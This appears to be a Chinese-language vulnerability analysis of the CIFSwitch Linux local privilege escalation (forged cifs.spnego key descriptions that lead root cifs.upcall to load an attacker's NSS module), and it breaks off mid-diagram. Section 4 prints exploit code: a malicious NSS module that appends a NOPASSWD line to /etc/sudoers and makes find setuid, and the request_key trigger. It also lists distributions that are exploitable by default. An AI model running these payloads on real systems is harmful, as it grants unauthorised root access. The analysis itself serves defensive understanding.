# QVD-2026-29453 (CIFSwitch) 漏洞原理分析

## 1. 漏洞概述

### 1.1 基本信息

| 项目 | 内容 |
|------|------|
| **漏洞名称** | Linux Kernel CIFSwitch 本地权限提升漏洞 |
| **漏洞编号** | QVD-2026-29453 |
| **漏洞类型** | 本地权限提升 (Local Privilege Escalation) |
| **公开时间** | 2026-05-27 |
| **影响范围** | Linux Kernel CIFS 组件（自 2007 年起）+ cifs-utils ≥ 6.14 |
| **危害等级** | 高危 |
| **CVSS 3.1 分数** | 7.8 |
| **PoC 状态** | 已公开 |
| **技术细节** | 已公开 |

### 1.2 漏洞简介

CIFSwitch 是一个存在于 Linux 内核 CIFS/SMB 文件系统子系统中的本地权限提升漏洞。该漏洞自 2007 年引入，潜伏了长达 19 年之久。漏洞源于内核未对 `cifs.spnego` 类型密钥的描述信息做来源合法性校验，导致攻击者可以伪造密钥描述，触发 root 权限的 `cifs.upcall` 辅助程序，通过命名空间切换和 NSS 模块加载实现 root 代码执行。

### 1.3 漏洞的独特性与阴险之处

#### 1.3.1 攻击链的巧妙设计

CIFSwitch 的攻击链设计非常"阴险"，其核心不在于 `cifs.upcall` 本身作恶，而在于：

```
┌─────────────────────────────────────────────────────────────┐
│          CIFSwitch 攻击链的巧妙之处                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  传统漏洞思维：                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │  恶意程序 → 直接执行恶意操作 → 提权                 │    │
│  │  例如：缓冲区溢出 → 注入 shellcode → root shell     │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  CIFSwitch 的"阴险"之处：                                    │
│  ┌────────────────────────────────────────────────────┐    │
│  │  1. cifs.upcall 本身是合法的、善意的程序            │    │
│  │     - 它只是想完成 Kerberos 认证                     │    │
│  │     - 它没有主动作恶的意图                           │    │
│  │                                                     │    │
│  │  2. 问题在于内核留下的"后门"                         │    │
│  │     - 内核把 cifs.spnego 请求入口留给了本地用户      │    │
│  │     - 本该只由 CIFS 客户端生成的请求，可以被伪造     │    │
│  │                                                     │    │
│  │  3. 攻击者诱导善意的程序作恶                         │    │
│  │     - 伪造密钥描述 → 触发 cifs.upcall               │    │
│  │     - cifs.upcall 信任内核 → 但内核被欺骗           │    │
│  │     - 进入攻击者的命名空间 → 读攻击者的配置          │    │
│  │     - 加载攻击者的 NSS 模块 → 执行攻击者的代码       │    │
│  │                                                     │    │
│  │  4. 整个过程没有明显的"恶意代码注入"                 │    │
│  │     - 所有组件都是合法的                             │    │
│  │     - 只是信任关系被滥用                             │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  关键点：                                                    │
│  ┌────────────────────────────────────────────────────┐    │
│  │  不是 cifs.upcall 想作恶                            │    │
│  │  而是：                                             │    │
│  │  内核把本该只由 CIFS 客户端生成的入口                │    │
│  │  留给了本地用户伪造                                  │    │
│  │  ↓                                                  │    │
│  │  低权限用户可以让 root 权限的 cifs.upcall            │    │
│  │  走进自己布置好的 mount namespace                    │    │
│  │  ↓                                                  │    │
│  │  读自己的 nsswitch.conf                             │    │
│  │  ↓                                                  │    │
│  │  加载自己的 libnss_*.so.2                           │    │
│  │  ↓                                                  │    │
│  │  sudoers 就被写进去了                               │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.3.2 Non-Universal（非普遍性）漏洞特性

**重要**：作者原文明确强调，CIFSwitch 是 **non-universal** 的本地提权漏洞。

**含义**：
- 不是所有 Linux 系统都受影响
- 能否打通，取决于多个条件是否同时满足
- 不同发行版的默认配置差异很大

**影响漏洞可利用性的关键因素**：

| 因素 | 要求 | 说明 |
|------|------|------|
| **内核版本** | 未打补丁 | commit < 3da1fdf4efbc |
| **cifs-utils** | ≥ 6.14 | 旧版本无命名空间切换功能 |
| **request-key 规则** | 默认配置 | cifs.spnego 规则存在且有效 |
| **用户命名空间** | 允许非特权创建 | `kernel.unprivileged_userns_clone=1` |
| **挂载命名空间** | 允许非特权创建 | 通常与用户命名空间一起启用 |
| **SELinux/AppArmor** | 未阻断 | 默认策略可能阻断攻击链 |

**不同发行版的默认状态**：

```
┌─────────────────────────────────────────────────────────────┐
│          发行版默认配置状态（漏洞可利用性）                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  默认可利用（Stock Exploitable）：                           │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Linux Mint 21.3 / 22.3 (Cinnamon)               │    │
│  │  • CentOS Stream 9 (GNOME)                         │    │
│  │  • Rocky Linux 9 (Workstation)                     │    │
│  │  • Kali Linux 2021.4-2026.1 (headless)             │    │
│  │  • AlmaLinux 9.7 (Workstation/Azure)               │    │
│  │  • SLES 15 SP7, SLES SAP 15 SP7/16                 │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  安装 cifs-utils 后可利用：                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Ubuntu 18.04/20.04/22.04 LTS                    │    │
│  │  • Debian 11/12/13                                 │    │
│  │  • Pop!_OS 22.04/24.04                             │    │
│  │  • openSUSE Leap 15.6                              │    │
│  │  • Oracle Linux 8/9 (KVM)                          │    │
│  │  • Amazon Linux 2023 (SELinux permissive)          │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  默认被安全策略阻断：                                        │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Fedora 40-44 (SELinux)                          │    │
│  │  • Ubuntu 26.04 LTS (AppArmor)                     │    │
│  │  • CentOS Stream 10 (SELinux)                      │    │
│  │  • Rocky Linux 10 (SELinux)                        │    │
│  │  • AlmaLinux 10.1 (SELinux)                        │    │
│  │  • openSUSE Tumbleweed/Leap 16.0 (AppArmor)        │    │
│  │  • SLES 16 (SELinux)                               │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  不受影响：                                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • 未安装 cifs-utils 的系统                         │    │
│  │  • 禁用了非特权用户命名空间的系统                    │    │
│  │  • 内核已打补丁的系统                               │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.3.3 为什么说这条攻击链"很阴"

1. **信任链的隐蔽断裂**
   - 表面上：所有组件都是合法的，信任关系看起来正常
   - 实际上：内核→cifs.upcall 的信任链被攻击者伪造的输入打破
   - 隐蔽性：没有明显的恶意代码注入，只是信任被滥用

2. **权限提升的"合法"路径**
   - cifs.upcall 以 root 权限运行是设计要求
   - 命名空间切换是合法功能
   - NSS 查找是正常的系统调用
   - 但组合起来却实现了提权

3. **防御的困难性**
   - 不能简单地禁用 cifs.upcall（会影响正常功能）
   - 不能禁用命名空间（会影响容器等现代技术）
   - 必须在信任验证层面修复

4. **潜伏期极长**
   - 2007 年引入，2026 年发现
   - 19 年间经过无数次代码审计都未发现
   - 说明传统的审计方法对这类"逻辑漏洞"效果有限

### 1.4 影响版本

#### 受影响的内核版本
- Linux Kernel commit < `3da1fdf4efbc490041eb4f836bf596201203f8f2`
- 自 2007 年起所有支持 CIFS 的未打补丁版本

#### 受影响的 cifs-utils 版本
- cifs-utils >= 6.14（含部分旧版回溯修复引入问题版本）

#### 已知受影响的发行版
- Linux Mint 21.3 / 22.3（Cinnamon）
- CentOS Stream 9（GNOME）
- Rocky Linux 9（Workstation）
- Kali Linux 2021.4 / 2022.4 / 2023.4 / 2024.4 / 2025.4 / 2026.1（headless）
- AlmaLinux 9.7（Workstation / Azure cloud image）
- SUSE Linux Enterprise Server 15 SP7、SLES SAP 15 SP7、SLES SAP 16
- Ubuntu、Debian、Pop!_OS、openSUSE、Oracle Linux、Amazon Linux（当 cifs-utils 安装时）

### 1.5 利用条件

1. 系统安装 cifs-utils 并保留默认 cifs.spnego request-key 规则
2. Linux 内核 CIFS 模块可加载或内置
3. 启用非特权用户命名空间与挂载命名空间
4. 未被 AppArmor/SELinux 默认策略阻断（部分发行版默认阻断）

---

## 2. 漏洞背景

### 2.1 CIFS/SMB 协议

#### 2.1.1 CIFS 协议简介

CIFS (Common Internet File System) 是一种网络文件共享协议，也称为 SMB (Server Message Block)。它允许应用程序通过网络访问远程文件和资源，就像访问本地文件一样。

**主要用途**：
- Windows 与 Linux/Unix 系统之间的文件共享
- 网络存储访问
- 打印机共享
- 企业文件服务器访问

**协议演进**：
```
SMB 1.0 (1980s)
    ↓
CIFS (1996) - Microsoft 对 SMB 的扩展
    ↓
SMB 2.0 (2006) - Vista/Server 2008
    ↓
SMB 3.0 (2012) - Windows 8/Server 2012
    ↓
SMB 3.1.1 (2015) - Windows 10/Server 2016
```

#### 2.1.2 Linux CIFS 客户端

Linux 内核通过 CIFS 客户端实现 SMB/CIFS 协议支持，主要组件包括：

```
┌─────────────────────────────────────────────────────────────┐
│              Linux CIFS 客户端架构                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  用户空间：                                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  mount.cifs      - 挂载 SMB 共享                    │    │
│  │  cifs.upcall     - Kerberos/SPNEGO 认证辅助程序     │    │
│  │  cifs-utils      - 用户空间工具集                   │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↕                                  │
│  内核空间：                                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  fs/cifs/        - CIFS 文件系统实现                │    │
│  │  - cifssmb.c     - SMB 协议处理                     │    │
│  │  - connect.c     - 连接管理                         │    │
│  │  - sess.c        - 会话管理                         │    │
│  │  - cifs_spnego.c - SPNEGO 认证处理                 │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 SPNEGO 认证机制

#### 2.2.1 SPNEGO 简介

SPNEGO (Simple and Protected GSS-API Negotiation Mechanism) 是一种认证协商机制，用于在客户端和服务器之间协商最合适的认证机制。

**工作流程**：
```
客户端                          服务器
  │                               │
  │ 1. 初始认证请求                │
  │─────────────────────────────>│
  │                               │
  │ 2. 协商支持的认证机制          │
  │<─────────────────────────────│
  │                               │
  │ 3. 选择认证机制（如 Kerberos） │
  │─────────────────────────────>│
  │                               │
  │ 4. 使用选定机制进行认证        │
  │<────────────────────────────>│
  │                               │
  │ 5. 认证成功，建立会话          │
  │<────────────────────────────>│
  │                               │
```

#### 2.2.2 Kerberos 认证

Kerberos 是一种网络认证协议，使用强加密提供强认证服务。

**核心概念**：
- **KDC (Key Distribution Center)**：密钥分发中心
- **TGT (Ticket Granting Ticket)**：票据授予票据
- **Service Ticket**：服务票据
- **Principal**：主体（用户或服务）

**认证流程**：
```
┌─────────────────────────────────────────────────────────────┐
│                  Kerberos 认证流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  客户端           KDC (AS)         KDC (TGS)        服务器   │
│    │                 │                 │              │      │
│    │ 1. 请求 TGT     │                 │              │      │
│    │────────────────>│                 │              │      │
│    │                 │                 │              │      │
│    │ 2. 返回 TGT     │                 │              │      │
│    │<────────────────│                 │              │      │
│    │                 │                 │              │      │
│    │ 3. 请求服务票据 │                 │              │      │
│    │─────────────────────────────────>│              │      │
│    │                 │                 │              │      │
│    │ 4. 返回服务票据 │                 │              │      │
│    │<─────────────────────────────────│              │      │
│    │                 │                 │              │      │
│    │ 5. 使用票据访问 │                 │              │      │
│    │─────────────────────────────────────────────────>│      │
│    │                 │                 │              │      │
│    │ 6. 验证票据     │                 │              │      │
│    │<─────────────────────────────────────────────────│      │
│    │                 │                 │              │      │
└─────────────────────────────────────────────────────────────┘
```

### 2.3 Linux 密钥环 (Keyring)

#### 2.3.1 密钥环概述

Linux 密钥环是内核提供的一种密钥管理机制，用于存储和管理各种类型的密钥和认证信息。

**密钥类型**：
- `user`：用户定义的密钥
- `keyring`：密钥环（可包含其他密钥）
- `trusted`：可信密钥（由 TPM 生成）
- `encrypted`：加密密钥
- `cifs.spnego`：CIFS SPNEGO 认证密钥 ⚠️ 漏洞相关

**密钥环层次结构**：
```
┌─────────────────────────────────────────────────────────────┐
│                   密钥环层次结构                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│                  ┌──────────────┐                           │
│                  │  User Keyring │                          │
│                  └──────┬───────┘                           │
│                         │                                   │
│         ┌───────────────┼───────────────┐                  │
│         │               │               │                  │
│    ┌────▼────┐    ┌────▼────┐    ┌────▼────┐              │
│    │ Session │    │ Process │    │ Thread  │              │
│    │ Keyring │    │ Keyring │    │ Keyring │              │
│    └────┬────┘    └────┬────┘    └────┬────┘              │
│         │               │               │                  │
│    ┌────▼────┐    ┌────▼────┐    ┌────▼────┐              │
│    │  Keys   │    │  Keys   │    │  Keys   │              │
│    │  ...    │    │  ...    │    │  ...    │              │
│    └─────────┘    └─────────┘    └─────────┘              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 2.3.2 密钥操作 API

**关键系统调用**：
```c
// 请求密钥
key_serial_t request_key(const char *type,
                         const char *description,
                         const char *callout_info,
                         key_serial_t dest_keyring);

// 添加密钥
key_serial_t add_key(const char *type,
                     const char *description,
                     const void *payload,
                     size_t plen,
                     key_serial_t keyring);

// 密钥控制操作
long keyctl(int cmd, ...);
```

**request_key 工作流程**：
```
┌─────────────────────────────────────────────────────────────┐
│              request_key() 工作流程                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 用户调用 request_key("cifs.spnego", description, ...)  │
│     │                                                       │
│     ↓                                                       │
│  2. 内核查找密钥环中是否已有匹配的密钥                        │
│     │                                                       │
│     ├─> 找到 → 返回密钥                                      │
│     │                                                       │
│     └─> 未找到 → 触发 upcall                                │
│         │                                                   │
│         ↓                                                   │
│  3. 内核调用 /sbin/request-key                              │
│     │                                                       │
│     ↓                                                       │
│  4. /sbin/request-key 根据配置执行相应的辅助程序              │
│     │                                                       │
│     ↓                                                       │
│  5. 对于 cifs.spnego，执行 /usr/sbin/cifs.upcall            │
│     │                                                       │
│     ↓                                                       │
│  6. cifs.upcall 获取 Kerberos 票据并返回给内核               │
│     │                                                       │
│     ↓                                                       │
│  7. 内核创建密钥并返回给用户                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 2.3.3 密钥类型定义

每个密钥类型由 `struct key_type` 定义：

```c
struct key_type {
    const char *name;                    // 类型名称
    size_t def_datalen;                  // 默认数据长度

    // 关键回调函数
    int (*vet_description)(const char *description);  // ⚠️ 验证描述
    int (*preparse)(struct key_preparsed_payload *prep);
    void (*free_preparse)(struct key_preparsed_payload *prep);
    int (*instantiate)(struct key *key, struct key_preparsed_payload *prep);
    void (*destroy)(struct key *key);
    void (*revoke)(struct key *key);
    void (*describe)(const struct key *key, struct seq_file *m);
    // ...
};
```

**关键点**：`vet_description` 钩子用于验证密钥描述的合法性，防止用户伪造恶意描述。

### 2.4 CIFS SPNEGO 密钥机制

#### 2.4.1 cifs.spnego 密钥类型

在 Linux 内核中，CIFS SPNEGO 密钥类型定义如下（**`fs/cifs/cifs_spnego.c`**）：

```c
struct key_type cifs_spnego_key_type = {
    .name           = "cifs.spnego",
    .instantiate    = cifs_spnego_key_instantiate,
    .destroy        = cifs_spnego_key_destroy,
    .describe       = user_describe,
    // ⚠️ 注意：缺少 .vet_description 钩子！
};
```

**问题**：该定义缺少 `vet_description` 钩子，无法验证密钥描述是否来自内核 CIFS 模块。

#### 2.4.2 密钥描述格式

当 CIFS 需要进行 Kerberos 认证时，内核会构造如下格式的密钥描述：

```
ver=0x%x;host=%s;ip4=%pI4;sec=krb5;uid=0x%x;creduid=0x%x;user=%s;pid=0x%x
```

**字段说明**：
- `ver`：版本号
- `host`：服务器主机名
- `ip4/ip6`：服务器 IP 地址
- `sec`：安全机制（krb5 或 mskrb5）
- `uid`：用户 ID
- `creduid`：凭证 UID
- `user`：用户名
- `pid`：进程 ID ⚠️ 攻击者可控

**构造代码**（**`fs/cifs/cifs_spnego.c`**）：
```c
struct key *
cifs_get_spnego_key(struct cifs_ses *sesInfo)
{
    // ... 省略部分代码 ...

    // 构造密钥描述
    sprintf(dp, "ver=0x%x;host=%s;", CIFS_SPNEGO_UPCALL_VERSION, hostname);
    sprintf(dp, ";uid=0x%x", from_kuid_munged(&init_user_ns, sesInfo->linux_uid));
    sprintf(dp, ";creduid=0x%x", from_kuid_munged(&init_user_ns, sesInfo->cred_uid));
    sprintf(dp, ";pid=0x%x", current->pid);  // ⚠️ 当前进程 PID

    // 使用特殊凭证请求密钥
    saved_cred = override_creds(spnego_cred);
    spnego_key = request_key(&cifs_spnego_key_type, description, "");
    revert_creds(saved_cred);

    return spnego_key;
}
```

### 2.5 cifs.upcall 辅助程序

#### 2.5.1 cifs.upcall 功能

`cifs.upcall` 是 cifs-utils 提供的用户空间辅助程序，以 root 权限运行，负责：
- 解析密钥描述中的字段
- 获取 Kerberos 票据
- 构造 SPNEGO 认证数据
- 返回给内核

#### 2.5.2 关键处理逻辑

**解析密钥描述**：
```c
// cifs.upcall 解析以下字段：
// - ver: 版本号
// - host: 主机名
// - ip4/ip6: IP 地址
// - sec: 安全机制
// - uid: 用户 ID
// - creduid: 凭证 UID
// - user: 用户名
// - pid: 进程 ID ⚠️ 攻击者可控
// - upcall_target: 目标类型 ⚠️ 攻击者可控
```

**命名空间切换**：
当 `upcall_target=app` 时，cifs.upcall 会：
1. 根据 `pid` 查找目标进程
2. 切换到目标进程的命名空间（user namespace、mount namespace 等）
3. 在目标命名空间中执行后续操作

**NSS 查找**：
在目标命名空间中，cifs.upcall 会调用 `getpwuid()` 等函数进行用户查找，这会触发 NSS (Name Service Switch) 机制，加载共享库：
```c
// NSS 配置文件：/etc/nsswitch.conf
// 例如：passwd: files lib_nss_custom
// 会加载 libnss_custom.so.2
```

### 2.6 Linux 命名空间

#### 2.6.1 命名空间类型

Linux 提供多种命名空间用于资源隔离：

| 命名空间类型 | 隔离内容 | Clone 标志 |
|-------------|---------|-----------|
| User | 用户和组 ID | CLONE_NEWUSER |
| Mount | 挂载点 | CLONE_NEWNS |
| PID | 进程 ID | CLONE_NEWPID |
| Network | 网络栈 | CLONE_NEWNET |
| UTS | 主机名和域名 | CLONE_NEWUTS |
| IPC | System V IPC 和 POSIX 消息队列 | CLONE_NEWIPC |
| Cgroup | Cgroup 根目录 | CLONE_NEWCGROUP |

#### 2.6.2 User Namespace

User namespace 是关键的安全特性，允许非特权用户创建新的用户命名空间并在其中拥有 root 权限。

**权限模型**：
```
┌─────────────────────────────────────────────────────────────┐
│              User Namespace 权限模型                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  初始 User NS (real root)                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  UID 0 (root)                                      │    │
│  │  - 拥有所有权限                                     │    │
│  │  - 可以操作所有资源                                 │    │
│  └────────────────────────────────────────────────────┘    │
│                          │                                  │
│                          ↓ unshare(CLONE_NEWUSER)           │
│  子 User NS (unprivileged user)                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  UID 0 (namespace root)                            │    │
│  │  - 在命名空间内拥有 root 权限                        │    │
│  │  - 在父命名空间中是普通用户                          │    │
│  │  - 可以在该命名空间内执行 mount、创建文件等          │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**UID/GID 映射**：
```c
// /proc/[pid]/uid_map
// 格式：ns_uid   host_uid   count
// 例如：0        1000       1
// 表示命名空间内的 UID 0 映射到主机上的 UID 1000
```

#### 2.6.3 Mount Namespace

Mount namespace 隔离进程的文件系统视图。

**关键特性**：
- 每个命名空间可以有独立的挂载点
- 可以绑定挂载（bind mount）
- 可以创建私有挂载传播

**漏洞利用**：
攻击者可以在自己的 mount namespace 中：
1. 创建恶意文件（如伪造的 nsswitch.conf）
2. 准备恶意共享库（如 libnss_evil.so.2）
3. 诱导 root 进程进入该命名空间并加载恶意库

### 2.7 NSS (Name Service Switch)

#### 2.7.1 NSS 机制

NSS 是 Linux 的名字服务切换机制，用于配置各种系统数据库的查找方式。

**配置文件** (`/etc/nsswitch.conf`)：
```
passwd:    files systemd
group:     files systemd
shadow:    files
hosts:     files dns myhostname
networks:  files
protocols: files
services:  files
ethers:    files
rpc:       files
```

**查找流程**：
```
┌─────────────────────────────────────────────────────────────┐
│                  NSS 查找流程                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  应用程序调用 getpwuid(uid)                                  │
│     │                                                       │
│     ↓                                                       │
│  读取 /etc/nsswitch.conf                                    │
│     │                                                       │
│     ↓                                                       │
│  解析 passwd 配置行                                          │
│     │                                                       │
│     ↓                                                       │
│  按顺序尝试每个模块                                          │
│     │                                                       │
│     ├─> "files" → 查找 /etc/passwd                          │
│     │                                                       │
│     ├─> "systemd" → 加载 libnss_systemd.so.2                │
│     │                                                       │
│     └─> "custom" → 加载 libnss_custom.so.2 ⚠️ 恶意库        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 2.7.2 NSS 共享库

NSS 模块以共享库形式实现，动态加载：

```
/usr/lib/libnss_files.so.2
/usr/lib/libnss_dns.so.2
/usr/lib/libnss_systemd.so.2
/usr/lib/libnss_custom.so.2  ⚠️ 攻击者可创建
```

**漏洞利用**：
攻击者可以在自己的 mount namespace 中：
1. 创建伪造的 `/etc/nsswitch.conf`，包含恶意模块
2. 创建恶意共享库 `libnss_evil.so.2`
3. 当 root 进程进入该命名空间并调用 NSS 函数时，会加载恶意库
4. 恶意库以 root 权限执行，实现提权

---

## 3. 漏洞根本原因

### 3.1 核心问题：缺少 vet_description 钩子

#### 3.1.1 漏洞代码分析

在 **`fs/cifs/cifs_spnego.c`** 中，`cifs_spnego_key_type` 的定义如下：

```c
struct key_type cifs_spnego_key_type = {
    .name           = "cifs.spnego",
    .instantiate    = cifs_spnego_key_instantiate,
    .destroy        = cifs_spnego_key_destroy,
    .describe       = user_describe,
    // ⚠️ 缺少 .vet_description 钩子！
};
```

**对比其他密钥类型**：
```c
// 例如：DNS resolver 密钥类型
struct key_type key_type_dns_resolver = {
    .name           = "dns_resolver",
    .instantiate    = dns_resolver_instantiate,
    .vet_description = dns_vet_description,  // ✓ 有验证钩子
    // ...
};
```

#### 3.1.2 vet_description 的作用

`vet_description` 钩子用于验证密钥描述的合法性：

```c
// 正常流程：内核构造密钥描述
description = construct_cifs_spnego_description(ses);
// description = "ver=0x2;host=server;ip4=192.168.1.1;sec=krb5;uid=0x0;creduid=0x0;pid=1234"

// 请求密钥
key = request_key(&cifs_spnego_key_type, description, "");

// ⚠️ 漏洞流程：攻击者直接调用 request_key
description = "ver=0x2;host=evil;ip4=10.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=5678;upcall_target=app";
key = request_key("cifs.spnego", description, "");
// 由于缺少 vet_description，内核无法区分这是攻击者构造的！
```

### 3.2 攻击者可控字段

#### 3.2.1 关键字段分析

攻击者可以通过伪造密钥描述控制以下字段：

| 字段 | 作用 | 攻击价值 |
|------|------|---------|
| `pid` | 指定目标进程 ID | 诱导 cifs.upcall 切换到攻击者控制的命名空间 |
| `uid` | 用户 ID | 影响认证行为 |
| `creduid` | 凭证 UID | 影响 Kerberos 票据获取 |
| `upcall_target` | 目标类型 | 设置为 "app" 触发命名空间切换 |
| `host` | 主机名 | 可指向恶意服务器 |
| `ip4/ip6` | IP 地址 | 可指向恶意服务器 |

#### 3.2.2 恶意密钥描述示例

```c
// 攻击者构造的恶意描述
char *malicious_desc = "ver=0x2;"
                       "host=attacker.com;"
                       "ip4=10.0.0.1;"
                       "sec=krb5;"
                       "uid=0x0;"
                       "creduid=0x0;"
                       "pid=1234;"           // 攻击者进程的 PID
                       "upcall_target=app";  // 触发命名空间切换

// 直接调用 request_key
key_serial_t key = request_key("cifs.spnego", malicious_desc, "", KEY_SPEC_SESSION_KEYRING);
```

### 3.3 信任链断裂

#### 3.3.1 正常信任链

```
┌─────────────────────────────────────────────────────────────┐
│                正常的信任链                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  内核 CIFS 模块                                             │
│     │                                                       │
│     ├─> 构造合法的密钥描述                                   │
│     │   (包含正确的 pid、uid、creduid 等)                    │
│     │                                                       │
│     └─> 调用 request_key()                                  │
│         │                                                   │
│         ↓                                                   │
│  密钥环子系统                                                │
│     │                                                       │
│     └─> 触发 /sbin/request-key                              │
│         │                                                   │
│         ↓                                                   │
│  cifs.upcall (以 root 权限运行)                              │
│     │                                                       │
│     ├─> 解析密钥描述（信任内核生成的数据）                    │
│     │                                                       │
│     └─> 获取 Kerberos 票据                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 3.3.2 漏洞利用的信任链断裂

```
┌─────────────────────────────────────────────────────────────┐
│            漏洞利用：信任链断裂                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  攻击者进程（非特权）                                        │
│     │                                                       │
│     ├─> 构造恶意的密钥描述                                   │
│     │   (包含攻击者控制的 pid、upcall_target 等)             │
│     │                                                       │
│     └─> 直接调用 request_key() ⚠️                           │
│         │                                                   │
│         ↓                                                   │
│  密钥环子系统                                                │
│     │                                                       │
│     ├─> ⚠️ 缺少 vet_description，无法验证来源               │
│     │                                                       │
│     └─> 触发 /sbin/request-key                              │
│         │                                                   │
│         ↓                                                   │
│  cifs.upcall (以 root 权限运行)                              │
│     │                                                       │
│     ├─> 解析密钥描述（⚠️ 信任攻击者构造的数据）              │
│     │                                                       │
│     ├─> 根据 pid 切换到攻击者的命名空间 ⚠️                   │
│     │                                                       │
│     └─> 在攻击者命名空间中调用 NSS 查找 ⚠️                   │
│         │                                                   │
│         ↓                                                   │
│  加载攻击者的恶意 NSS 模块                                   │
│     │                                                       │
│     └─> 以 root 权限执行恶意代码 ⚠️                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 4. 完整攻击链分析

### 4.1 攻击准备阶段

#### 4.1.1 创建用户和挂载命名空间

```c
// 步骤 1：创建用户命名空间
unshare(CLONE_NEWUSER);

// 步骤 2：配置 UID/GID 映射
// 将命名空间内的 root (UID 0) 映射到外部的当前用户
// 写入 /proc/self/uid_map: "0 <current_uid> 1"
// 写入 /proc/self/gid_map: "0 <current_gid> 1"

// 步骤 3：创建挂载命名空间
unshare(CLONE_NEWNS);

// 步骤 4：在挂载命名空间中准备恶意环境
// - 创建伪造的 /etc/nsswitch.conf
// - 创建恶意共享库 libnss_evil.so.2
```

#### 4.1.2 准备 NSS 恶意环境

**目录结构**：
```
攻击者的 mount namespace:
/tmp/cifswitch/
├── etc/
│   └── nsswitch.conf      # 伪造的 NSS 配置
└── lib/
    └── libnss_evil.so.2   # 恶意 NSS 模块
```

**伪造的 nsswitch.conf**：
```
passwd:    evil  # 加载 libnss_evil.so.2
group:     evil
shadow:    evil
```

**恶意 NSS 模块** (`libnss_evil.so.2`)：
```c
// libnss_evil.c
#include <nss.h>
#include <pwd.h>
#include <grp.h>
#include <shadow.h>

// 当 getpwuid() 被调用时，会调用此函数
enum nss_status _nss_evil_getpwuid_r(uid_t uid, struct passwd *pwd,
                                     char *buffer, size_t buflen,
                                     int *errnop) {
    // ⚠️ 以 root 权限执行恶意代码
    system("echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers");

    // 返回错误，让 NSS 继续查找其他模块
    return NSS_STATUS_UNAVAIL;
}

// 类似地实现其他 NSS 函数
enum nss_status _nss_evil_getpwnam_r(const char *name, struct passwd *pwd,
                                     char *buffer, size_t buflen,
                                     int *errnop) {
    system("chmod u+s /usr/bin/find");  // 创建 SUID 后门
    return NSS_STATUS_UNAVAIL;
}
```

### 4.2 触发漏洞阶段

#### 4.2.1 构造恶意密钥描述

```c
// 获取当前进程 PID
pid_t my_pid = getpid();

// 构造恶意密钥描述
char description[256];
snprintf(description, sizeof(description),
         "ver=0x2;"                    // 版本号
         "host=attacker.com;"          // 主机名（可以是任意值）
         "ip4=10.0.0.1;"               // IP 地址（可以是任意值）
         "sec=krb5;"                   // 安全机制
         "uid=0x0;"                    // 用户 ID
         "creduid=0x0;"                // 凭证 UID
         "pid=0x%x;"                   // 当前进程 PID ⚠️
         "upcall_target=app",          // 触发命名空间切换 ⚠️
         my_pid);

printf("Malicious description: %s\n", description);
```

#### 4.2.2 触发 request_key

```c
// 直接调用 request_key 系统调用
key_serial_t key = syscall(__NR_request_key,
                           "cifs.spnego",    // 密钥类型
                           description,       // 恶意描述
                           "",                // callout_info
                           KEY_SPEC_SESSION_KEYRING);  // 目标密钥环

if (key < 0) {
    perror("request_key failed");
    // 失败是预期的，因为 cifs.upcall 无法真正获取 Kerberos 票据
    // 但 NSS 恶意代码已经被执行了！
}
```

### 4.3 漏洞执行流程

#### 4.3.1 完整执行流程

```
┌─────────────────────────────────────────────────────────────┐
│                  完整攻击执行流程                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  T0: 攻击者准备                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │  1. 创建 user namespace 和 mount namespace          │    │
│  │  2. 配置 UID/GID 映射                               │    │
│  │  3. 准备恶意 NSS 环境                                │    │
│  │     - 伪造 /etc/nsswitch.conf                       │    │
│  │     - 创建 libnss_evil.so.2                         │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T1: 构造恶意密钥描述                                        │
│  ┌────────────────────────────────────────────────────┐    │
│  │  description = "ver=0x2;host=...;pid=1234;         │    │
│  │                 upcall_target=app"                  │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T2: 调用 request_key                                       │
│  ┌────────────────────────────────────────────────────┐    │
│  │  key = request_key("cifs.spnego", description, "") │    │
│  │  ⚠️ 内核缺少 vet_description，无法验证来源          │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T3: 内核触发 /sbin/request-key                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  根据 /etc/request-key.d/ 配置                      │    │
